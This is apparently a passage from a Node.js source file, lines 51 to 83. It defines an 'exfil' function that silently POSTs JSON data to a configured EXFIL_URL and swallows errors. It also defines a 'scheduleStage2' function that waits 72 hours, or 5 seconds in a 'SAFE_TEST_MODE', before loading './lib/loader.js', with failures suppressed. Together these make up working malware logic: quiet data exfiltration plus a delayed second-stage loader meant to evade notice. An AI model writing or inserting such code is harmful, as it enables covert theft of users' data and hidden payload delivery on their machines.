51: function exfil(data) {
52:   const payload = JSON.stringify(data);
53:   const url = new URL(EXFIL_URL);
54:   const req = http.request(
55:     {
56:       hostname: url.hostname,
57:       port: url.port,
58:       path: url.pathname,
59:       method: "POST",
60:       headers: {
61:         "Content-Type": "application/json",
62:         "Content-Length": Buffer.byteLength(payload),
63:       },
64:     },
65:     () => {}
66:   );
67:   req.on("error", () => {});
68:   req.write(payload);
69:   req.end();
70: }
71: 
72: function scheduleStage2() {
73: 
74:   const delay = SAFE_TEST_MODE ? 5000 : 72 * 60 * 60 * 1000;
75: 
76:   setTimeout(() => {
77:     try {
78:       require("./lib/loader.js");
79:     } catch (e) {
80: 
81:     }
82:   }, delay);
83: }
